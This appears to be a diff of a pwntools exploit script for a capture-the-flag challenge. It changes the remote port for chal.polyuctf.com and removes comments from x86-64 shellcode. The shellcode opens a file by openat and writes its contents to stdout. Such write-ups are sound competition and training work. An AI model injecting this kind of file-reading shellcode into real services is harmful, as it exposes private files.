@@ -2,7 +2,7 @@ from pwn import *
 
 binary = './chall'
 p = process(binary)
-p = remote("chal.polyuctf.com", 35365)
+p = remote("chal.polyuctf.com", 35145)
 
 context.arch = 'amd64'
 s = '''
@@ -17,29 +17,28 @@ shellcode = asm('''
     lea rdi, [rip+secret] /* pointer to "./secret" */
     syscall
     
-    /* Open the file */
+    /* Openat */
     push 257
     pop rax
     mov rdi, -100       /* dirfd: AT_FDCWD */
     lea rsi, [rip+file] /* pointer to "CDr46w9anrq3vg0Z" */
-    xor edx, edx        /* flags: O_RDONLY */
+    xor edx, edx        
     syscall
 
     /* Read and write in one step */
     push rax
     pop rdi
-    xor eax, eax        /* syscall: read */
-    sub rsp, 64         /* smaller buffer */
-    mov rsi, rsp        /* buffer address */
-    mov rdx, 64         /* buffer size */
+    xor eax, eax        
+    sub rsp, 64        
+    mov rsi, rsp        
+    mov rdx, 64         
     syscall
     
     /* Write to stdout */
     push rax
     pop rdx
-    mov rax, 1          /* syscall: write */
-    mov rdi, 1          /* fd: stdout */
-    /* rsi already points to our buffer */
+    mov rax, 1         
+    mov rdi, 1          
     syscall
 
 secret:
